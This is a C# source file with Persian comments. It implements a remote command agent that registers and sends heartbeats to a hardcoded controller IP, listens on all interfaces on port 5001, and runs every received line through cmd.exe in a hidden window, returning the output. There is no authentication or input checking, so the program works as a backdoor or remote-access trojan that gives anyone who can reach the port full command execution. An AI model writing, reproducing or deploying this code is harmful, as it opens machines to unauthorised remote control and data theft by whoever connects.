using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace ServerApp
{
    class Program
    {
        public static bool flag = false;
        const string controllerIp = "192.168.165.99"; // آدرس IP RemoteController
        const int port = 5000; // پورتی که سرور گوش می‌دهد
        const int cport = 5001; // پورتی که سرور گوش می‌دهد
        public static string clientName = Environment.MachineName;
        static TcpListener command_listener;
        static void Main(string[] args)
        {



            Thread thread1 = new Thread(() =>
            {
                while (true)
                {
                    try
                    {
                        using (TcpClient client = new TcpClient())
                        {
                            Console.WriteLine("Attempting to connect to RemoteController...");
                            client.Connect(controllerIp, port); // تلاش برای اتصال

                            using (NetworkStream stream = client.GetStream())
                            using (StreamWriter writer = new StreamWriter(stream, Encoding.UTF8) { AutoFlush = true })
                            {
                                if (!flag)
                                {
                                    writer.WriteLine($"register:{clientName}");
                                    Console.WriteLine("Registration message sent.");
                                    flag = true;
                                }
                                else
                                {
                                    writer.WriteLine($"heartbeat from:{clientName}");
                                    Console.WriteLine("Heartbeat message sent.");
                                }
                            }
                        }
                    }
                    catch (SocketException)
                    {
                        Console.WriteLine("Controller is not available. Retrying...");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error in thread1: {ex.Message}");
                    }

                    Thread.Sleep(10000); // تأخیر قبل از تلاش مجدد
                }
            });

            thread1.Start();

            Thread thread2 = new Thread(() =>
            {

                command_listener = new TcpListener(IPAddress.Any, cport);
               
                while (true)
                {
                    try
                    {
                        command_listener.Start();
                        TcpClient client = command_listener.AcceptTcpClient();
                        Console.WriteLine("Client connected.");

                        using (NetworkStream stream = client.GetStream())
                        using (StreamReader reader = new StreamReader(stream, Encoding.UTF8))
                        using (StreamWriter writer = new StreamWriter(stream, Encoding.UTF8) { AutoFlush = true })
                        {
                            string command = reader.ReadLine();
                            Console.WriteLine($"Command received: {command}");

                            // اجرای دستور CMD
                            string result = ExecuteCommand(command);
                            Console.WriteLine($"Result: {result}");

                            // ارسال نتیجه به کلاینت
                            writer.WriteLine(result);
                        }
                        client.Close();
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error: {ex.Message}");
                    }
                    finally
                    {
                        if (command_listener != null)
                        {
                            command_listener.Stop();
                            Console.WriteLine("Listener on port 5001 stopped.");
                        }
                    }
                    Thread.Sleep(1000); // تأخیر قبل از تلاش مجدد
                }
            });
            thread2.Start();
            bool IsPortListening(string ipAddress, int port)
            {
                try
                {
                    using (TcpClient client = new TcpClient())
                    {
                        client.Connect(ipAddress, port); // تلاش برای اتصال
                        client.Dispose();
                        return true; // اگر اتصال موفق باشد، یعنی پورت در حال گوش دادن است

                    }
                }
                catch (SocketException)
                {
                    return false; // اگر خطا رخ داد، یعنی کسی گوش نمی‌دهد
                }
            }
            AppDomain.CurrentDomain.ProcessExit += (sender, e) =>
            {
                if (command_listener != null)
                {
                    command_listener.Stop();
                   
                    Console.WriteLine("Listener stopped on exit.");
                }
            };
        }

        static string ExecuteCommand(string command)
        {
            try
            {
                Process process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c {command}",
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    }
                };

                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                return string.IsNullOrWhiteSpace(error) ? output : error;
            }
            catch (Exception ex)
            {
                return $"Error executing command: {ex.Message}";
            }
        }



    }
}